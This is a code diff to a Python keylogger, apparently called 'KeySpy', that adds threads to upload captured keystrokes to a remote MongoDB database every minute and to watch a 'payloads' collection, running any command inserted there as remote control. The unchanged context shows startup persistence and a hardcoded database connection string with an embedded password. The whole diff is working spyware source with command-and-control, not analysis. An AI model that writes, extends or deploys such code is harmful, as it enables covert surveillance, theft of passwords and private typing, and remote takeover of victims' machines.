@@ -3,6 +3,7 @@ import sys
 import time
 import datetime
 import requests
+import threading
 import pynput
 import pyautogui
 import pygetwindow
@@ -15,6 +16,7 @@ from pymongo import MongoClient
 client = MongoClient('mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/?retryWrites=true&w=majority&appName=KeySpy&ssl=true&ssl_cert_reqs=CERT_NONE')
 db = client['keylogger_db']
 keylogs_collection = db['keylogs']
+payloads_collection = db['payloads']  # Separate collection for payloads
 
 # Buffer size for key logs
 BUFFER_SIZE = 50
@@ -82,6 +84,14 @@ def add_to_startup():
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
+def send_logs():
+    """Send logs to MongoDB every minute if buffer is not empty."""
+    while True:
+        time.sleep(60)
+        if keylog_buffer:
+            keylogs_collection.insert_many(keylog_buffer)
+            keylog_buffer.clear()
+
 # Command map for dynamic payload execution
 command_map = {
     "STRING": lambda arg: pyautogui.typewrite(arg),
@@ -112,10 +122,27 @@ def execute_payload(file_path):
     except Exception as e:
         print(f"Failed to execute payload: {e}")
 
+def watch_payloads():
+    """Watches for new payload insertions in MongoDB and executes them."""
+    with payloads_collection.watch() as stream:
+        for change in stream:
+            if change['operationType'] == 'insert':
+                payload = change['fullDocument']
+                command = payload.get('command')
+                if command:
+                    print(f"Executing payload: {command}")
+                    execute_command(command)
+
 if __name__ == "__main__":
     # Add to startup
     add_to_startup()
 
-    # Start keylogger
+    # Start keylogger in a separate thread
     keylogger = Keylogger()
-    keylogger.start_keylogger()
+    threading.Thread(target=keylogger.start_keylogger).start()
+
+    # Start log sending every 1 minute in a separate thread
+    threading.Thread(target=send_logs).start()
+
+    # Start watching MongoDB for payloads
+    threading.Thread(target=watch_payloads).start()
